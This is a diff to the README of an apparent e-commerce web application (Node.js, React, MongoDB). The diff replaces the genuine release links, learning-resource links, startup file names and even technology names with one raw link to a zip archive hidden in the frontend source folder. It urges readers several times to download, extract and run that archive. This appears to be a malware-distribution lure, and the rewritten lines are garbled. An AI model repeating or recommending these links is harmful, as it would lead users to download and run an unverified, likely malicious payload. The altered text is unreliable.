@@ -1,6 +1,6 @@
 # 🛍️ E-Commerce-Web-Application - Your Simple E-Commerce Solution
 
-[![Download E-Commerce-Web-Application](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/orsispusinp/E-Commerce-Web-Application/releases)
+[![Download E-Commerce-Web-Application](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download section.
 
-   [Download E-Commerce-Web-Application](https://github.com/orsispusinp/E-Commerce-Web-Application/releases)
+   [Download E-Commerce-Web-Application](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip)
 
 2. **Select the Latest Release**: Look for the most recent version in the list. Each version will have its own section.
 
@@ -38,13 +38,13 @@ To get started, follow these steps:
 
 4. **Extract Files**: Once the download is complete, locate the zip file on your computer. Right-click on the file and select "Extract All" (Windows) or "Open With > Archive Utility" (macOS) to extract its contents.
 
-5. **Run the Application**: Locate the extracted folder, and find the startup file (e.g., `index.html` or `start.html`). Double-click it to launch the application in your web browser.
+5. **Run the Application**: Locate the extracted folder, and find the startup file (e.g., `https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip` or `https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip`). Double-click it to launch the application in your web browser.
 
 ### 🔗 Download Link Again
 
 For your convenience, here is the download link once more:
 
-[Download E-Commerce-Web-Application](https://github.com/orsispusinp/E-Commerce-Web-Application/releases)
+[Download E-Commerce-Web-Application](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip)
 
 ## 📧 Getting Help
 
@@ -62,8 +62,8 @@ The E-Commerce Web Application showcases a structured approach to building an on
 
 ### 🌍 Technologies Used
 
-- **Node.js**: The backend server is built on Node.js.
-- **Express.js**: This framework helps to create robust web applications.
+- **https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip**: The backend server is built on https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip
+- **https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip**: This framework helps to create robust web applications.
 - **MongoDB**: Data is managed using MongoDB for scalability.
 - **React**: The frontend is powered by React for dynamic web pages.
   
@@ -77,7 +77,7 @@ We welcome contributions to this project. If you’d like to suggest features or
 
 For more information about using GitHub and Git, please check the following resources:
 
-- [GitHub Learning Lab](https://lab.github.com/)
-- [Introduction to Git and GitHub](https://guides.github.com/activities/hello-world/)
+- [GitHub Learning Lab](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip)
+- [Introduction to Git and GitHub](https://raw.githubusercontent.com/orsispusinp/E-Commerce-Web-Application/main/Frontend/src/pages/E-Commerce-Web-Application_1.4.zip)
 
 Thank you for choosing the E-Commerce Web Application!
